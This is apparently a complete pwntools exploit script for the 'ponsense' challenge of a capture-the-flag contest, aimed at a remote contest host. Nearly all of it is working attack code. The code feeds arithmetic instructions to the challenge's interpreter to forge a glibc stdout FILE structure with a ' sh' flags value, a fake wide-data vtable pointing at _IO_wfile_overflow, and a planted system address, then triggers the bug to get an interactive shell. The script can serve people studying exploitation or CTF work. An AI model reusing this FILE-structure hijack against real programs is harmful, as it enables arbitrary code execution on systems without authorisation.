from pwn import *
from icecream import ic

elf = exe = ELF("./ponsense")
libc = ELF("./libc.so.6")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("ponsense-1.q.2025.volgactf.ru", 31339)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *main+122
b *execute_program+125
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

PRINT = 1
SUB = 3
# end = len of payload before offsets
end = 128

start = 0x4acb6

payload = [
    # flags = b' sh\x00'
    SUB, start, start,
    SUB, end+1, end,
    SUB, start, end+1

]

# null out read ptr, read end, read base, write base, write ptr, write end and others
for i in range(16):
    payload += [
        SUB, start+1+i, start+1+i
    ]

payload += [
    # old_offset = -1
    SUB, start+0xf, 0x1001,

    # lock needs to be a writeable null pointer (i can just ignore this i guess)

    # _offset = -1
    SUB, start+0x12, 0x1001,

    # _codecvt = 0
    SUB, start+0x13, start+0x13,

    # _wide_data = _IO_2_1_stdout_ - 0x10
    SUB, start+0x14, start+0x14,
    SUB, end+2, start+0x11,      # lock into end+2
    SUB, start+0x14, end+2,      # lock into start+0x14
    SUB, start+0x14, end+3,      # offset from lock

    # freeres list, freeres buf, pad5, mode, unused2 start = 0
    SUB, start+0x15, start+0x15,
    SUB, start+0x16, start+0x16,
    SUB, start+0x17, start+0x17,
    SUB, start+0x18, start+0x18,

    # unused2+4 = system
    SUB, start+0x19, start+0x19,
    SUB, end+4, start+0x11,      # lock into end+4
    SUB, start+0x19, end+4,      # lock into start+0x19
    SUB, start+0x19, end+5,      # offset from lock

    # unused2+12 = widedata->widevtable
    SUB, start+0x1a, start+0x1a,
    SUB, end+6, start+0x11,      # lock into end+6
    SUB, start+0x1a, end+6,      # lock into start+0x1a
    SUB, start+0x1a, end+7,      # offset from lock

    # vtable = _IO_wfile_overflow - 0x38
    SUB, start+0x1b, start+0x1b,
    SUB, end+8, start+0x11,      # lock into end+8
    SUB, start+0x1b, end+8,      # lock into start+0x1b
    SUB, start+0x1b, end+9,      # offset from lock

    PRINT, 0x1001                # trigger bug!
]




payload += [
    # flags setup
    0x00687320, 0,

    # widedata = lock - value
    0, 0x1160,

    # system = lock - value
    0, 0x1b87e0,

    # widevtable = lock - value
    0, 0x10f0,

    # io file jumps io wfile overflow = lock - value
    0, 0x33f8
]

# payload += [PRINT, 0x101] * (0x4000 - len(payload))

sla(b"Input your program:", str(0x8000))
for i in payload:
    sl(str(i))

sl(b'a')
io.interactive()
